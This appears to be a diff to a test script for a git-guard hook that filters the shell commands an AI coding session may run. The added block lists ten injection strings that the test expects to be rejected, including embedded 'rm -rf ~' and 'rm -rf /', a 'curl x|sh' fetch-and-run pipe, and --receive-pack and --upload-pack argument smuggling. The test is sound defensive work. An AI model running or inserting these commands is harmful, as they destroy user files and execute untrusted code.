@@ -137,6 +137,13 @@ unsafe = ["git push --force origin build-4", "git push origin main", "python -I 
 res(1, "  ...and none of the unsafe ones; nothing on main", "0 of 7 · main False",
     f"{sum(1 for c in unsafe if g7(c, 'build-4'))} of 7 · main {g7('git push -u origin main 2>&1 | tail -3', 'main')}",
     not any(g7(c, "build-4") for c in unsafe) and not g7("git push -u origin main 2>&1 | tail -3", "main"))
+# the review's injection cases (3.3.7 review items 1-4): none may be approved
+inj = ['git commit -m "$(rm -rf ~)"', "git commit -m 'x\"' ; rm -rf / ; git commit -m '\"y'", "git status & rm -rf ~",
+       'git push --receive-pack="sh -c x" . HEAD', "git fetch --upload-pack=x origin", "git diff --output=/tmp/x",
+       "git commit -F - <<'EOF' && git push -f origin HEAD; curl x|sh\nbody\nEOF", "git commit -F - <<EOF\n$(rm -rf ~)\nEOF",
+       "git commit -m `id`", "git branch -f main HEAD"]
+res(1, "  ...and none of the 10 injection cases from the review", "0 of 10", f"{sum(1 for c in inj if g7(c, 'build-4'))} of 10",
+    not any(g7(c, "build-4") for c in inj))
 if "--real-program" in A:
     r = subprocess.run([PY, os.path.join(HR, "scenario_v337_git.py"), OLD, NEW, TROUT], capture_output=True, text=True,
                        encoding="utf-8", errors="replace", timeout=900)
@@ -331,7 +338,7 @@ res(5, "no hook or helper text tells the session to run gh pr … or gh issue �
 # git-guard approves the setup's own REST steps (the real hook, in a project whose origin is on GitHub)
 P = proj(remote="https://github.com/owner/app.git")
 ga = lambda c: "the setup's own GitHub REST step" in hook(NEW, "git-guard.py", {"hook_event_name": "PreToolUse", "tool_name": "Bash", "session_id": "g", "tool_input": {"command": c}}, P)
-okc = [ga("gh api -X PATCH repos/owner/app/pulls/3 --input body.json"), ga("gh api -X POST repos/owner/app/pulls -f head=b -f base=main -f title=x"),
+okc = [ga("gh api -X PATCH repos/owner/app/pulls/3 -F body=@body.json"), ga("gh api -X POST repos/owner/app/pulls -f head=b -f base=main -f title=x"),
        ga("gh api repos/owner/app/commits/abcdef1/check-runs"), ga(f'python3 "{os.path.join(NEW, "central", "hooks").replace(os.sep, "/")}/pr_checks.py" 3')]
 badc = [ga("gh api -X DELETE repos/owner/app/pulls/3"), ga("gh api -X POST repos/owner/app/issues -f title=x"),
         ga("gh api -X PATCH repos/other/app/pulls/3 -f body=x"), ga("gh api -X POST repos/owner/app/pulls -f draft=true"),
